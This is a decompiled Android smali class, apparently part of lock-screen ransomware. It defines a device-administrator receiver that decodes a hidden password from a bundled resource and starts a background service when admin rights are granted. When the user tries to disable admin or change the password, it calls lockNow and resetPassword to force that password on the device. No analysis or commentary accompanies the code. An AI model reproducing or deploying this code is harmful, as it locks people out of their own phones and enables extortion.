.class public Lcom/cjk/MyAdmin;
.super Landroid/app/admin/DeviceAdminReceiver;
.source "MyAdmin.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 52
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 12
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 28
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v9, v1

    invoke-virtual {v9}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v9

    const v10, 0x7f060001

    invoke-virtual {v9, v10}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v9

    move-object v4, v9

    .line 29
    move-object v9, v4

    invoke-static {v9}, Lcom/cjk/BAH;->getString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v9

    move-object v5, v9

    .line 30
    move-object v9, v5

    const-string v10, "\n"

    const-string v11, ""

    invoke-virtual {v9, v10, v11}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    move-object v6, v9

    .line 31
    move-object v9, v6

    invoke-static {v9}, Lcom/cjk/M;->getsss(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    move-object v7, v9

    .line 32
    move-object v9, v0

    move-object v10, v1

    invoke-virtual {v9, v10}, Lcom/cjk/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;

    move-result-object v9

    invoke-virtual {v9}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    .line 33
    move-object v9, v0

    move-object v10, v1

    invoke-virtual {v9, v10}, Lcom/cjk/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;

    move-result-object v9

    move-object v10, v7

    const/4 v11, 0x0

    invoke-virtual {v9, v10, v11}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    move-result v9

    .line 34
    move-object v9, v0

    move-object v10, v1

    move-object v11, v2

    invoke-super {v9, v10, v11}, Landroid/app/admin/DeviceAdminReceiver;->onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;

    move-result-object v9

    move-object v0, v9

    return-object v0
.end method

.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 19
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 13
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, p2

    move-object v11, v1

    invoke-virtual {v11}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v11

    const v12, 0x7f060001

    invoke-virtual {v11, v12}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v11

    move-object v4, v11

    .line 14
    move-object v11, v4

    invoke-static {v11}, Lcom/cjk/BAH;->getString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v11

    move-object v5, v11

    .line 15
    move-object v11, v5

    const-string v12, "\n"

    const-string v13, ""

    invoke-virtual {v11, v12, v13}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    move-object v6, v11

    .line 16
    move-object v11, v6

    invoke-static {v11}, Lcom/cjk/M;->getsss(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    move-object v7, v11

    .line 17
    new-instance v11, Landroid/content/Intent;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v1

    :try_start_0
    const-string v14, "com.cjk.s"

    invoke-static {v14}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v14

    invoke-direct {v12, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v8, v11

    .line 18
    move-object v11, v8

    const/high16 v12, 0x10000000

    invoke-virtual {v11, v12}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    move-result-object v11

    .line 19
    move-object v11, v1

    move-object v12, v8

    invoke-virtual {v11, v12}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v11

    .line 20
    move-object v11, v0

    move-object v12, v1

    invoke-virtual {v11, v12}, Lcom/cjk/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;

    move-result-object v11

    move-object v12, v7

    const/4 v13, 0x0

    invoke-virtual {v11, v12, v13}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    move-result v11

    .line 21
    move-object v11, v0

    move-object v12, v1

    move-object v13, v2

    invoke-super {v11, v12, v13}, Landroid/app/admin/DeviceAdminReceiver;->onEnabled(Landroid/content/Context;Landroid/content/Intent;)V

    return-void

    .line 17
    :catch_0
    move-exception v11

    move-object v9, v11

    new-instance v11, Ljava/lang/NoClassDefFoundError;

    move-object/from16 v18, v11

    move-object/from16 v11, v18

    move-object/from16 v12, v18

    move-object v13, v9

    invoke-virtual {v13}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v11
.end method

.method public onPasswordChanged(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 39
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move-object v9, v1

    invoke-virtual {v9}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v9

    const v10, 0x7f060001

    invoke-virtual {v9, v10}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v9

    move-object v4, v9

    .line 40
    move-object v9, v4

    invoke-static {v9}, Lcom/cjk/BAH;->getString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v9

    move-object v5, v9

    .line 41
    move-object v9, v5

    const-string v10, "\n"

    const-string v11, ""

    invoke-virtual {v9, v10, v11}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    move-object v6, v9

    .line 42
    move-object v9, v6

    invoke-static {v9}, Lcom/cjk/M;->getsss(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    move-object v7, v9

    .line 44
    move-object v9, v0

    move-object v10, v1

    invoke-virtual {v9, v10}, Lcom/cjk/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;

    move-result-object v9

    invoke-virtual {v9}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    .line 45
    move-object v9, v0

    move-object v10, v1

    invoke-virtual {v9, v10}, Lcom/cjk/MyAdmin;->getManager(Landroid/content/Context;)Landroid/app/admin/DevicePolicyManager;

    move-result-object v9

    move-object v10, v7

    const/4 v11, 0x0

    invoke-virtual {v9, v10, v11}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z

    move-result v9

    .line 46
    move-object v9, v0

    move-object v10, v1

    move-object v11, v2

    invoke-super {v9, v10, v11}, Landroid/app/admin/DeviceAdminReceiver;->onPasswordChanged(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Landroid/content/Intent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 50
    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    const-string v4, "------"

    const-string v5, "onReceive-----"

    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    .line 51
    move-object v4, v0

    move-object v5, v1

    move-object v6, v2

    invoke-super {v4, v5, v6}, Landroid/app/admin/DeviceAdminReceiver;->onReceive(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method
